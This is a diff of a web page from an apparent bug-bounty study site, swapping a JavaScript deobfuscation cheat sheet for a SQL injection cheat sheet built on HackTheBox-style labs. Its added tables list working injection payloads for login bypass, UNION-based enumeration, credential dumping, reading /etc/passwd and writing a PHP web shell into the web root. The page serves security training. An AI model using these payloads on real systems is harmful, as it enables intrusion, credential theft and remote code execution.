@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../attacking-web-applications-with-ffuf/">
+        <link rel="prev" href="../cross-site-scripting-%28xss%29/">
       
       
-        <link rel="next" href="../cross-site-scripting-%28xss%29/">
+        <link rel="next" href="../sqlmap-essentials/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>JavaScript Deobfuscation - Bug Bounty Hub</title>
+        <title>SQL Injection Fundamentals - Bug Bounty Hub</title>
       
     
     
@@ -62,7 +62,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#javascript-deobfuscation" class="md-skip">
+        <a href="#sql-injection" class="md-skip">
           Skip to content
         </a>
       
@@ -98,7 +98,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              JavaScript Deobfuscation
+              SQL Injection Fundamentals
             
           </span>
         </div>
@@ -431,32 +431,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    JavaScript Deobfuscation
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -467,62 +445,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
-    <span class="md-ellipsis">
-      Terms
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commands
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
-    <span class="md-ellipsis">
-      Useful Websites
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -555,10 +477,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../sql-injection-fundamentals/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    SQL Injection Fundamentals
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -569,6 +513,155 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MySQL">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#general" class="md-nav__link">
+    <span class="md-ellipsis">
+      General
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tables
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#columns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Columns
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#output" class="md-nav__link">
+    <span class="md-ellipsis">
+      Output
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mysql-operator-precedence" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL Operator Precedence
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#auth-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Auth Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#auth-bypass-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Auth Bypass Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#union-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Union Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#db-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      DB Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privileges
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -984,38 +1077,131 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
+  <a href="#mysql" class="md-nav__link">
     <span class="md-ellipsis">
-      Terms
+      MySQL
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MySQL">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#general" class="md-nav__link">
+    <span class="md-ellipsis">
+      General
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#tables" class="md-nav__link">
     <span class="md-ellipsis">
-      Commands
+      Tables
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#columns" class="md-nav__link">
     <span class="md-ellipsis">
-      Useful Websites
+      Columns
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#output" class="md-nav__link">
     <span class="md-ellipsis">
-      Misc
+      Output
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mysql-operator-precedence" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL Operator Precedence
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#auth-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Auth Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#auth-bypass-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Auth Bypass Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#union-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Union Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#db-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      DB Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privileges
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1035,47 +1221,9 @@
 
 
 
-<h1 id="javascript-deobfuscation">JavaScript Deobfuscation</h1>
-<h2 id="terms">Terms</h2>
-<table>
-<thead>
-<tr>
-<th>Term</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Code minification</td>
-<td>Reduces code to a single line often saved as .min.js.</td>
-</tr>
-<tr>
-<td>Packing</td>
-<td>Obfuscation recognizable from the six function arguments used in the initial function "function(p,a,c,k,e,d)".</td>
-</tr>
-<tr>
-<td>JSFuck</td>
-<td>Programming style based in the atomic parts of JS. Uses only ()+[]! (aa and jj encode are similar).</td>
-</tr>
-<tr>
-<td>Base 64</td>
-<td>Contains only alpha-numeric, + and /. Padded with '='.</td>
-</tr>
-<tr>
-<td>Hex</td>
-<td>Encodes each char into its hex on the ASCII table. Contains 0-9 and a-f.</td>
-</tr>
-<tr>
-<td>Ceasar</td>
-<td>Shifts each char by a fixed number</td>
-</tr>
-<tr>
-<td>Rot13</td>
-<td>Most common ceaser cipher, shifts by 13</td>
-</tr>
-</tbody>
-</table>
-<h2 id="commands">Commands</h2>
+<h1 id="sql-injection">SQL Injection</h1>
+<h2 id="mysql">MySQL</h2>
+<h3 id="general">General</h3>
 <table>
 <thead>
 <tr>
@@ -1085,126 +1233,275 @@
 </thead>
 <tbody>
 <tr>
-<td><code>curl http://SERVER_IP:PORT/</code></td>
-<td>cURL GET request</td>
+<td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td>
+<td>login to mysql database</td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST</code></td>
-<td>cURL POST request</td>
+<td><code>SHOW DATABASES</code></td>
+<td>List available databases</td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"</code></td>
-<td>cURL POST with data</td>
-</tr>
-<tr>
-<td><code>echo hackthebox | base64</code></td>
-<td>base64 encode</td>
-</tr>
-<tr>
-<td><code>echo ENCODED_B64 | base64 -d</code></td>
-<td>base64 decode</td>
-</tr>
-<tr>
-<td><code>echo hackthebox | xxd -p</code></td>
-<td>hex encode</td>
-</tr>
-<tr>
-<td><code>echo ENCODED_HEX | xxd -p -r</code></td>
-<td>hex decode</td>
-</tr>
-<tr>
-<td><code>echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 encode</td>
-</tr>
-<tr>
-<td><code>echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 decode</td>
+<td><code>USE users</code></td>
+<td>Switch to database</td>
 </tr>
 </tbody>
 </table>
-<h2 id="useful-websites">Useful Websites</h2>
+<h3 id="tables">Tables</h3>
 <table>
 <thead>
 <tr>
-<th>Site</th>
+<th>Command</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><a href="https://jsconsole.com/">JS Console</a></td>
-<td>Interactive JavaScript console for testing code.</td>
+<td><code>CREATE TABLE logins (id INT, ...)</code></td>
+<td>Add a new table</td>
 </tr>
 <tr>
-<td><a href="https://www.toptal.com/developers/javascript-minifier">JS Minifier</a></td>
-<td>Minifies JavaScript for performance optimization.</td>
+<td><code>SHOW TABLES</code></td>
+<td>List available tables in current database</td>
 </tr>
 <tr>
-<td><a href="https://beautifytools.com/javascript-obfuscator.php">BeatifyTools</a></td>
-<td>Obfuscates JavaScript to protect code.</td>
+<td><code>DESCRIBE logins</code></td>
+<td>Show table properties and columns</td>
 </tr>
 <tr>
-<td><a href="https://obfuscator.io/">JS Obfuscator Tool</a></td>
-<td>Tool to obfuscate JavaScript code securely.</td>
+<td><code>INSERT INTO table_name VALUES (value_1,..)</code></td>
+<td>Add values to table</td>
 </tr>
 <tr>
-<td><a href="https://jsfuck.com/">JSFuck</a></td>
-<td>Encodes JavaScript using only six characters.</td>
+<td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td>
+<td>Add values to specific columns in a table</td>
 </tr>
 <tr>
-<td><a href="https://utf-8.jp/public/jjencode.html">jjencode</a></td>
-<td>Encodes JavaScript with JJEncode technique.</td>
-</tr>
-<tr>
-<td><a href="https://utf-8.jp/public/aaencode.html">aaencode</a></td>
-<td>Encodes JavaScript with AAEncode method.</td>
-</tr>
-<tr>
-<td><a href="https://prettier.io/playground/">Prettier</a></td>
-<td>Formats and beautifies JavaScript code.</td>
-</tr>
-<tr>
-<td><a href="https://beautifier.io/">js-beautify</a></td>
-<td>Beautifies minified or obfuscated JavaScript.</td>
-</tr>
-<tr>
-<td><a href="https://matthewfl.com/unPacker.html">UnPacker</a></td>
-<td>Deobfuscates and unpacks JavaScript code.</td>
-</tr>
-<tr>
-<td><a href="https://rot13.com/">rot13.com</a></td>
-<td>Applies ROT13 encoding/decoding for text.</td>
-</tr>
-<tr>
-<td><a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Cipher Identifier</a></td>
-<td>Identifies cipher types in encoded text.</td>
+<td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td>
+<td>Update table values</td>
 </tr>
 </tbody>
 </table>
-<h2 id="misc">Misc</h2>
+<h3 id="columns">Columns</h3>
 <table>
 <thead>
 <tr>
-<th>Command/Action</th>
+<th>Command</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>ctrl+u</code></td>
-<td>Show HTML source code in Firefox</td>
+<td><code>SELECT * FROM table_name</code></td>
+<td>Show all columns in a table</td>
 </tr>
 <tr>
-<td><code>ctrl+shift+z</code></td>
-<td>Open browser debugger tab</td>
+<td><code>SELECT column1, column2 FROM table_name</code></td>
+<td>Show specific columns in a table</td>
 </tr>
 <tr>
-<td>'{ }' button</td>
-<td>Pretty print in debugger tab</td>
+<td><code>DROP TABLE logins</code></td>
+<td>Delete a table</td>
 </tr>
 <tr>
-<td>Unpack</td>
-<td>Replace eval function with console.log</td>
+<td><code>ALTER TABLE logins ADD newColumn INT</code></td>
+<td>Add new column</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td>
+<td>Rename column</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td>
+<td>Change column datatype</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins DROP oldColumn</code></td>
+<td>Delete column</td>
+</tr>
+</tbody>
+</table>
+<h3 id="output">Output</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1</code></td>
+<td>Sort by column</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td>
+<td>Sort by column in descending order</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td>
+<td>Sort by two-columns</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins LIMIT 2</code></td>
+<td>Only show first two results</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins LIMIT 1, 2</code></td>
+<td>Only show first two results starting from index 2</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins WHERE &lt;condition&gt;</code></td>
+<td>List results that meet a condition</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins WHERE username LIKE 'admin%'</code></td>
+<td>List results where the name is similar to a given string</td>
+</tr>
+</tbody>
+</table>
+<h3 id="mysql-operator-precedence">MySQL Operator Precedence</h3>
+<ul>
+<li>Division (/), Multiplication (*), and Modulus (%)</li>
+<li>Addition (+) and Subtraction (-)</li>
+<li>Comparison (=, &gt;, &lt;, &lt;=, &gt;=, !=, LIKE)</li>
+<li>NOT (!)</li>
+<li>AND (&amp;&amp;)</li>
+<li>OR (||)</li>
+</ul>
+<h2 id="sql-injection_1">SQL Injection</h2>
+<h3 id="auth-bypass">Auth Bypass</h3>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>admin' or '1'='1</code></td>
+<td>Basic Auth Bypass</td>
+</tr>
+<tr>
+<td><code>admin')-- -</code></td>
+<td>Basic Auth Bypass With comments</td>
+</tr>
+</tbody>
+</table>
+<h3 id="auth-bypass-payloads">Auth Bypass Payloads</h3>
+<h3 id="union-injection">Union Injection</h3>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>' order by 1-- -</code></td>
+<td>Detect number of columns using order by</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,2,3-- -</code></td>
+<td>Detect number of columns using Union injection</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,@@version,3,4-- -</code></td>
+<td>Basic Union injection</td>
+</tr>
+<tr>
+<td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td>
+<td>Union injection for 4 columns</td>
+</tr>
+</tbody>
+</table>
+<h3 id="db-enumeration">DB Enumeration</h3>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SELECT @@version</code></td>
+<td>Fingerprint MySQL with query output</td>
+</tr>
+<tr>
+<td><code>SELECT SLEEP(5)</code></td>
+<td>Fingerprint MySQL with no output</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,database(),2,3-- -</code></td>
+<td>Current database name</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td>
+<td>List all databases</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code></td>
+<td>List all tables in a specific database</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code></td>
+<td>List all columns in a specific table</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code></td>
+<td>Dump data from a table in another database</td>
+</tr>
+</tbody>
+</table>
+<h3 id="privileges">Privileges</h3>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cn' UNION SELECT 1, user(), 3, 4-- -</code></td>
+<td>Find current user</td>
+</tr>
+<tr>
+<td><code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</code></td>
+<td>Find if user has admin privileges</td>
+</tr>
+<tr>
+<td><code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -</code></td>
+<td>Find if all user privileges</td>
+</tr>
+<tr>
+<td><code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</code></td>
+<td>Find which directories can be accessed through MySQL</td>
+</tr>
+</tbody>
+</table>
+<h3 id="file-injection">File Injection</h3>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</code></td>
+<td>Read local file</td>
+</tr>
+<tr>
+<td><code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code></td>
+<td>Write a string to a local file</td>
+</tr>
+<tr>
+<td><code>cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -</code></td>
+<td>Write a web shell into the base web directory</td>
 </tr>
 </tbody>
 </table>
